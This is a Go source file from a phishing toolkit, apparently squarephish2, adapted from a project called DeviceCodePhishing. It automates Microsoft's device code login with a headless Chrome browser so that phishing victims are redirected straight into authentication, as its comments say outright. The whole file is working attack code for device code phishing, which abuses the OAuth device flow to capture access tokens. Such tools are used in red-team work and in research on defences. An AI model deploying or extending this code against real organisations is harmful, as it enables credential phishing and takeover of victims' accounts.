package server

// ------------------------------------------------------------------------
// https://github.com/denniskniep/DeviceCodePhishing
// https://github.com/denniskniep/DeviceCodePhishing/blob/main/LICENSE
//
// Copyright 2025 Dennis Kniep
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// 	http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ------------------------------------------------------------------------

import (
	"context"
	"log/slog"
	"time"
	"net/url"
	"strings"
	"fmt"

	"github.com/chromedp/chromedp"
	"github.com/nromsdahl/squarephish2/internal/models"
)

// EnterDeviceCodeWithHeadlessBrowser will pull through the device code flow to retrieve the final URL
// and redirect the victim directly to authentication.
// Parameters:
//   - deviceCode: The device code response object.
//   - requestConfig: The request configuration.
//
// It returns the final URL or an error if the device code flow fails.
//
// https://github.com/denniskniep/DeviceCodePhishing/blob/main/pkg/entra/devicecode.go#L101
func EnterDeviceCodeWithHeadlessBrowser(deviceCode models.DeviceCodeResponse, requestConfig models.RequestConfig, tenantInfo *models.TenantInfo) (string, error) {
	allocatorOpts := chromedp.DefaultExecAllocatorOptions[:]
	allocatorOpts = append(allocatorOpts, chromedp.Flag("headless", true))
	allocatorOpts = append(allocatorOpts, chromedp.UserAgent(requestConfig.UserAgent))
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), allocatorOpts...)

	var contextOpts []chromedp.ContextOption
	contextOpts = append(contextOpts, chromedp.WithDebugf(slog.Debug))
	ctx, cancel = chromedp.NewContext(ctx, contextOpts...)

	defer cancel()

	var finalUrl string
	err := chromedp.Run(ctx,
		chromedp.Navigate(deviceCode.VerificationURI),

		chromedp.WaitVisible(`#idSIButton9`),
		chromedp.SendKeys(`#otc`, deviceCode.UserCode),
		chromedp.Click(`#idSIButton9`),

		chromedp.WaitVisible(`//input[@name="loginfmt"]`, chromedp.BySearch),
		chromedp.WaitVisible(`//input[@type="submit"]`, chromedp.BySearch),
		chromedp.SendKeys(`//input[@name="loginfmt"]`, tenantInfo.ExampleUpn, chromedp.BySearch),
		chromedp.Click(`//input[@type="submit"]`, chromedp.BySearch),
	)

	waitTimeMaxMs := 10000
	waitTimeIntervalMs := 10
	waitTimeCurrentMs := 0

	for waitTimeCurrentMs <= waitTimeMaxMs {
		time.Sleep(time.Duration(waitTimeIntervalMs) * time.Millisecond)
		waitTimeCurrentMs = waitTimeCurrentMs + waitTimeIntervalMs

		err = chromedp.Run(ctx, chromedp.Location(&finalUrl))
		if err != nil {
			return "", err
		}

		finalUrlParsed, err := url.Parse(finalUrl)
		if err != nil {
			return "", err
		}

		if strings.EqualFold(finalUrlParsed.Host, tenantInfo.UserRealmInfo.GetFederatedAuthURLHost()) {
			return removeUpn(finalUrlParsed, tenantInfo.ExampleUpn)
		}
	}

	return "", fmt.Errorf("no redirect to federated authentication URL found")
}

// removeUpn removes the UPN from the URL query parameters.
// Parameters:
//   - location: The URL location.
//   - upn: The UPN to remove.
//
// It returns the URL with the UPN removed or an error if the URL is invalid.
//
// https://github.com/denniskniep/DeviceCodePhishing/blob/main/pkg/entra/devicecode.go#L155
func removeUpn(location *url.URL, upn string) (string, error) {
	queryParameters := location.Query()

	for key, values := range location.Query() {
		for _, val := range values {
			if strings.EqualFold(val, upn) {
				queryParameters.Del(key)
				slog.Info("Removed Queryparameter '" + key + "'")
			}
		}
	}
	location.RawQuery = queryParameters.Encode()
	return location.String(), nil
}
